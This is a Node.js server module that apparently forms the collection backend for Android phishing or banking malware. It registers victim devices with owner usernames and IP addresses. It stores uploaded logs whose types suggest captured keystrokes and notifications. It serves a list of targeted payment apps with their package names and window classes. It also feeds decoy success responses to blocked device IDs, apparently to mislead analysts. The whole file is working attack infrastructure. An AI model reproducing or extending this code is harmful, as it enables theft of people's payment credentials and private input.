'use strict';

const crypto = require('crypto');
const zlib = require('zlib');

const FREE_HTTP_BODY_LIMIT = 2 * 1024 * 1024;

function readRequestBody(req) {
  return new Promise((resolve, reject) => {
    const chunks = [];
    let size = 0;
    req.on('data', chunk => {
      size += chunk.length;
      if (size > FREE_HTTP_BODY_LIMIT) {
        reject(new Error('request body too large'));
        req.destroy();
        return;
      }
      chunks.push(chunk);
    });
    req.on('end', () => resolve(Buffer.concat(chunks)));
    req.on('error', reject);
  });
}

function decodeRequestBody(req, body) {
  const encoding = String(req.headers['content-encoding'] || '').toLowerCase();
  if (encoding === 'gzip') return zlib.gunzipSync(body);
  if (encoding === 'deflate') return zlib.inflateSync(body);
  return body;
}

function normalizeRegistration(data) {
  return {
    deviceId: String(data.di || data.deviceId || '').trim(),
    brand: data.br || data.brand || '',
    model: data.md || data.model || '',
    ownerUsername: data.ou || data.ownerUsername || '',
    appName: data.an || data.appName || '',
  };
}

function sendJson(res, statusCode, payload) {
  res.writeHead(statusCode, {
    'Content-Type': 'application/json; charset=utf-8',
    'Cache-Control': 'no-store',
  });
  res.end(JSON.stringify(payload));
}

function createFreeHttpHandlers(dbPool, options = {}) {
  const blockedDeviceIds = options.blockedDeviceIds || new Set();

  async function handleRegister(req, res) {
    try {
      const rawBody = await readRequestBody(req);
      const decodedBody = decodeRequestBody(req, rawBody);
      const data = JSON.parse(decodedBody.toString('utf8') || '{}');
      const registration = normalizeRegistration(data);
      if (!registration.deviceId) {
        sendJson(res, 400, { error: 'missing device id' });
        return;
      }
      if (blockedDeviceIds.has(registration.deviceId)) {
        sendJson(res, 200, { tk: crypto.randomBytes(32).toString('hex'), wu: '/w' });
        return;
      }

      const now = Math.floor(Date.now() / 1000);
      await dbPool.execute(
        `INSERT INTO fisher_devices
         (device_id, brand, model, app_name, owner_username, public_ip,
          is_connected, connected_at, last_seen, first_seen, created_at)
         VALUES (?, ?, ?, ?, ?, ?, 0, ?, ?, ?, ?)
         ON DUPLICATE KEY UPDATE
           brand=IF(VALUES(brand)='', brand, VALUES(brand)),
           model=IF(VALUES(model)='', model, VALUES(model)),
           app_name=IF(VALUES(app_name)='', app_name, VALUES(app_name)),
           owner_username=IF(owner_username IS NULL OR owner_username='', VALUES(owner_username), owner_username),
           public_ip=VALUES(public_ip), last_seen=VALUES(last_seen)`,
        [
          registration.deviceId,
          String(registration.brand),
          String(registration.model),
          String(registration.appName),
          String(registration.ownerUsername),
          req._realIp || (req.socket.remoteAddress || '').replace('::ffff:', ''),
          now, now, now, now,
        ]
      );

      const token = crypto.randomBytes(32).toString('hex');
      console.log(`[Free-HTTP] Registered ${registration.deviceId} owner=${registration.ownerUsername || '-'} model=${registration.model || '-'}`);
      sendJson(res, 200, { tk: token, wu: '/w' });
    } catch (err) {
      console.error('[Free-HTTP] /n error:', err.message);
      sendJson(res, 400, { error: 'invalid registration request' });
    }
  }

  async function handleLogs(req, res) {
    try {
      const rawBody = await readRequestBody(req);
      const decodedBody = decodeRequestBody(req, rawBody);
      const parsed = JSON.parse(decodedBody.toString('utf8') || '[]');
      const logs = Array.isArray(parsed) ? parsed : (Array.isArray(parsed.logs) ? parsed.logs : []);
      const deviceId = String(req.headers['x-k'] || parsed.deviceId || '').trim();
      if (!deviceId) {
        sendJson(res, 400, { error: 'missing device id' });
        return;
      }
      if (blockedDeviceIds.has(deviceId)) {
        sendJson(res, 200, { count: logs.length, ok: true });
        return;
      }

      const allowedTypes = new Set(['KSTR', 'NTFS', 'VAPS', 'BLNK', 'ACTZ', 'ARTS']);
      const operationRows = [];
      const bridgeRows = [];
      const now = Math.floor(Date.now() / 1000);
      for (const item of logs) {
        if (!item || typeof item !== 'object') continue;
        const logType = String(item.logType || item.log_type || item.type || 'INFO').toUpperCase();
        const content = String(item.content || item.message || '');
        if (!content) continue;
        const rawTimestamp = Number(item.timestamp || 0);
        const timestamp = rawTimestamp > 100000000000 ? Math.floor(rawTimestamp / 1000) : (rawTimestamp || now);
        const row = [deviceId, logType, content, timestamp, now];
        (allowedTypes.has(logType) ? operationRows : bridgeRows).push(row);
      }

      if (operationRows.length) {
        await dbPool.query(
          'INSERT INTO fisher_operation_logs (device_id, log_type, content, timestamp, created_at) VALUES ?',
          [operationRows]
        );
      }
      if (bridgeRows.length) {
        await dbPool.query(
          'INSERT INTO fisher_bridge_logs (device_id, log_type, content, timestamp, created_at) VALUES ?',
          [bridgeRows]
        );
      }
      sendJson(res, 200, { count: operationRows.length + bridgeRows.length, ok: true });
    } catch (err) {
      console.error('[Free-HTTP] /p/k error:', err.message);
      sendJson(res, 400, { error: 'invalid log request' });
    }
  }

  async function handlePaymentStrategies(req, res) {
    const strategies = [];
    try {
      const [rows] = await dbPool.query(
        'SELECT app_name AS appName, package_name AS packageName, windows AS winClasses FROM fisher_payment_strategies WHERE enabled=1 ORDER BY id ASC'
      );
      for (const row of rows || []) {
        let classes = row.winClasses;
        if (typeof classes === 'string') {
          try { classes = JSON.parse(classes); } catch { classes = []; }
        }
        strategies.push({
          appName: row.appName || '',
          packageName: row.packageName || '',
          winClasses: Array.isArray(classes) ? classes : [],
        });
      }
    } catch (err) {
      console.warn('[Free-HTTP] payment strategies fallback:', err.message);
    }
    sendJson(res, 200, { strategies });
  }

  return { handleRegister, handleLogs, handlePaymentStrategies };
}

module.exports = {
  createFreeHttpHandlers,
  decodeRequestBody,
  normalizeRegistration,
};
